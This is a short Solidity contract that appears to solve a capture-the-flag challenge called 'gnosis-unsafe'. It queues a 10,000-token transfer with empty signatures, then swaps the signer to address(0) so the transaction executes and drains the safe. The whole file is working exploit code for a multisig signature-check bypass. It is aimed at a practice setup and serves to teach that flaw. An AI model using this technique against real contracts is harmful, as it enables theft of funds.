// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.15;

import { Setup, GREY, Safe } from "src/gnosis-unsafe/Setup.sol";
import { ISafe } from "src/gnosis-unsafe/interfaces/ISafe.sol";

contract Exploit {
    Setup setup;

    Safe.Transaction transaction;
    uint8[3] v;
    bytes32[3] r;
    bytes32[3] s;

    constructor(Setup _setup) {
        setup = _setup;
    }

    // Execute this first
    function solvePart1() external {
        // Create transaction that transfers 10,000 GREY tokens out 
        transaction = ISafe.Transaction({
            signer: address(0x1337),
            to: address(setup.grey()),
            value: 0,
            data: abi.encodeCall(GREY.transfer, (msg.sender, 10_000e18))
        });

        // Queue the transaction
        setup.safe().queueTransaction(v, r, s, transaction);
    }

    // Execute this around 1 minute after solvePart1()
    function solvePart2() external {
        // Set the signer to address(0)
        transaction.signer = address(0);

        // Execute the transaction
        setup.safe().executeTransaction(v, r, s, transaction, 0);
    }
}